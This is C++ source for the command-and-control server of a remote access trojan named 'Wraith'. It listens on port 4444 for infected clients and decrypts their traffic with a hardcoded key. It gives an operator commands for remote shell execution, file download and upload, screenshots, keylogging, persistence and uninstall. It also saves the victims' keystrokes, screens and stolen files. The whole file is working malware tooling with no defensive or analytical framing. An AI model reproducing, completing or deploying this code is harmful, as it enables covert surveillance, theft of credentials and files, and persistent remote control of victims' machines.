#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <thread>
#include <vector>
#include <map>
#include <string>
#include <sstream>
#include <fstream>
#include "protocol.h"
#include "crypto.h"
#pragma comment(lib, "ws2_32.lib")

using namespace wraith;

struct Client {
    SOCKET sock;
    std::string name;
};

static std::map<int, Client> clients;
static int nextId = 1;
static std::string KEY = "wraith-4080-external";

void handle_client(int id) {
    char buf[8192];
    std::vector<uint8_t> accum;
    while (true) {
        int r = recv(clients[id].sock, buf, sizeof(buf), 0);
        if (r <= 0) { std::cout << "[!] client " << id << " disconnected\n"; closesocket(clients[id].sock); clients.erase(id); return; }
        accum.insert(accum.end(), buf, buf+r);
        Packet pkt; size_t consumed;
        while (unpack(accum, pkt, consumed)) {
            accum.erase(accum.begin(), accum.begin() + consumed);
            auto dec = crypt(pkt.payload, KEY);
            switch (pkt.cmd) {
                case HELO: {
                    clients[id].name = std::string(dec.begin(), dec.end());
                    std::cout << "[+] client " << id << ": " << clients[id].name << "\n";
                    break;
                }
                case SHELL_OUT: {
                    std::cout << std::string(dec.begin(), dec.end()) << "\n";
                    break;
                }
                case SYSINFO: {
                    std::cout << "[sysinfo] " << std::string(dec.begin(), dec.end()) << "\n";
                    break;
                }
                case FILE_DATA: {
                    std::ofstream f("received.bin", std::ios::binary|std::ios::app);
                    f.write((char*)dec.data(), dec.size()); f.close();
                    break;
                }
                case FILE_DONE: {
                    std::cout << "[+] file transfer complete\n";
                    break;
                }
                case KEYLOG: {
                    std::cout << "[keylog]\n" << std::string(dec.begin(), dec.end()) << "\n";
                    break;
                }
                case SCREEN: {
                    std::ofstream f("screen.bmp", std::ios::binary);
                    f.write((char*)dec.data(), dec.size()); f.close();
                    std::cout << "[+] screenshot saved screen.bmp\n";
                    break;
                }
                case OK: std::cout << "[ok]\n"; break;
                case ERR: std::cout << "[err]\n"; break;
            }
        }
    }
}

void listener_thread() {
    WSADATA w; WSAStartup(MAKEWORD(2,2), &w);
    SOCKET ls = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in a{}; a.sin_family = AF_INET; a.sin_port = htons(4444); a.sin_addr.s_addr = INADDR_ANY;
    bind(ls, (sockaddr*)&a, sizeof(a)); listen(ls, 16);
    std::cout << "[*] Wraith controller listening on 4444\n";
    while (true) {
        SOCKET c = accept(ls, nullptr, nullptr);
        int id = nextId++;
        clients[id] = {c, "unknown"};
        std::thread(handle_client, id).detach();
    }
}

void send_cmd(int id, uint8_t cmd, const std::string& data) {
    std::vector<uint8_t> d(data.begin(), data.end());
    auto p = pack(cmd, d);
    auto c = crypt(p, KEY);
    send(clients[id].sock, (char*)c.data(), (int)c.size(), 0);
}

int main() {
    std::thread(listener_thread).detach();
    std::string line;
    while (true) {
        std::cout << "wraith> ";
        std::getline(std::cin, line);
        std::istringstream iss(line);
        std::string tok; iss >> tok;
        if (tok == "sessions") {
            for (auto& [id, c] : clients) std::cout << id << " - " << c.name << "\n";
        } else if (tok == "exec" || tok == "shell") {
            std::string rest; std::getline(iss, rest);
            if (!clients.empty() && !rest.empty()) send_cmd(clients.begin()->first, EXEC, rest.substr(1));
        } else if (tok == "download") {
            std::string p; iss >> p; if (!clients.empty()) send_cmd(clients.begin()->first, DOWNLOAD, p);
        } else if (tok == "upload") {
            std::string p; iss >> p;
            std::ifstream f(p, std::ios::binary);
            std::vector<char> data((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
            std::string payload = p + "\0" + std::string(data.begin(), data.end());
            if (!clients.empty()) send_cmd(clients.begin()->first, UPLOAD, payload);
        } else if (tok == "screen") {
            if (!clients.empty()) send_cmd(clients.begin()->first, SCREEN, "");
        } else if (tok == "keylog") {
            if (!clients.empty()) send_cmd(clients.begin()->first, KEYLOG, "");
        } else if (tok == "persist") {
            if (!clients.empty()) send_cmd(clients.begin()->first, PERSIST, "");
        } else if (tok == "uninstall") {
            if (!clients.empty()) send_cmd(clients.begin()->first, UNINSTALL, "");
        } else if (tok == "sysinfo") {
            if (!clients.empty()) send_cmd(clients.begin()->first, SYSINFO, "");
        } else if (tok == "exit") break;
    }
    return 0;
}
